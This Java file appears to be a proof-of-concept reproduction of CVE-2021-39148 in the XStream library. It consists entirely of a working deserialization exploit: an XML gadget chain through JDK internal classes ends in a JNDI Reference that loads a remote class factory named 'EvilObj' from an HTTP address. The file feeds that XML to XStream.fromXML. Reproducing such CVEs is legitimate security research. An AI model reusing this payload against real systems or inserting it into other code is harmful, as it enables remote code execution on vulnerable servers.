package com.r17a.xstream.cve.sortedset;

import com.thoughtworks.xstream.XStream;

public class CVE_2021_39148 {
    public static void main(String[] args) {
        String xml = "<sorted-set>\n" +
                "  <javax.naming.ldap.Rdn_-RdnEntry>\n" +
                "    <type>ysomap</type>\n" +
                "    <value class='com.sun.xml.internal.ws.api.message.Packet' serialization='custom'>\n" +
                "      <message class='com.sun.xml.internal.ws.message.saaj.SAAJMessage'>\n" +
                "        <parsedMessage>true</parsedMessage>\n" +
                "        <soapVersion>SOAP_11</soapVersion>\n" +
                "        <bodyParts/>\n" +
                "        <sm class='com.sun.xml.internal.messaging.saaj.soap.ver1_1.Message1_1Impl'>\n" +
                "          <attachmentsInitialized>false</attachmentsInitialized>\n" +
                "          <multiPart class='com.sun.xml.internal.messaging.saaj.packaging.mime.internet.MimePullMultipart'>\n" +
                "            <soapPart/>\n" +
                "            <mm>\n" +
                "              <it class='com.sun.org.apache.xml.internal.security.keys.storage.implementations.KeyStoreResolver$KeyStoreIterator'>\n" +
                "                <aliases class='com.sun.jndi.toolkit.dir.ContextEnumerator'>\n" +
                "                  <children class='javax.naming.directory.BasicAttribute$ValuesEnumImpl'>\n" +
                "                    <list class='com.sun.xml.internal.dtdparser.SimpleHashtable'>\n" +
                "                      <current>\n" +
                "                        <hash>1</hash>\n" +
                "                        <key class='javax.naming.Binding'>\n" +
                "                          <name>ysomap</name>\n" +
                "                          <isRel>false</isRel>\n" +
                "                            <boundObj class='com.sun.jndi.ldap.LdapReferralContext'>\n" +
                "                              <refCtx class='javax.naming.spi.ContinuationDirContext'>\n" +
                "                                <cpe>\n" +
                "                                  <stackTrace/>\n" +
                "                                  <suppressedExceptions class='java.util.Collections$UnmodifiableRandomAccessList' resolves-to='java.util.Collections$UnmodifiableList'>\n" +
                "                                    <c class='list'/>\n" +
                "                                    <list reference='../c'/>\n" +
                "                                  </suppressedExceptions>\n" +
                "                                  <resolvedObj class='javax.naming.Reference'>\n" +
                "                                    <className>EvilObj</className>\n" +
                "                                    <addrs/>\n" +
                "                                    <classFactory>EvilObj</classFactory>\n" +
                "                                    <classFactoryLocation>http://127.0.0.1:1099/</classFactoryLocation>\n" +
                "                                  </resolvedObj>\n" +
                "                                  <altName class='javax.naming.CompoundName' serialization='custom'>\n" +
                "                                    <javax.naming.CompoundName>\n" +
                "                                      <properties/>\n" +
                "                                      <int>1</int>\n" +
                "                                      <string>ysomap</string>\n" +
                "                                    </javax.naming.CompoundName>\n" +
                "                                  </altName>\n" +
                "                                </cpe>\n" +
                "                              </refCtx>\n" +
                "                              <skipThisReferral>false</skipThisReferral>\n" +
                "                              <hopCount>0</hopCount>\n" +
                "                            </boundObj>\n" +
                "                        </key>\n" +
                "                      </current>\n" +
                "                      <currentBucket>0</currentBucket>\n" +
                "                      <count>0</count>\n" +
                "                      <threshold>0</threshold>\n" +
                "                    </list>\n" +
                "                  </children>\n" +
                "                  <currentReturned>true</currentReturned>\n" +
                "                  <currentChildExpanded>false</currentChildExpanded>\n" +
                "                  <rootProcessed>true</rootProcessed>\n" +
                "                  <scope>2</scope>\n" +
                "                </aliases>\n" +
                "              </it>\n" +
                "            </mm>\n" +
                "          </multiPart>\n" +
                "        </sm>\n" +
                "      </message>\n" +
                "    </value>\n" +
                "  </javax.naming.ldap.Rdn_-RdnEntry>\n" +
                "  <javax.naming.ldap.Rdn_-RdnEntry>\n" +
                "    <type>ysomap</type>\n" +
                "    <value class='com.sun.org.apache.xpath.internal.objects.XString'>\n" +
                "      <m__obj class='string'>test</m__obj>\n" +
                "    </value>\n" +
                "  </javax.naming.ldap.Rdn_-RdnEntry>\n" +
                "</sorted-set>";
        XStream xstream = new XStream();
        xstream.fromXML(xml);
    }
}
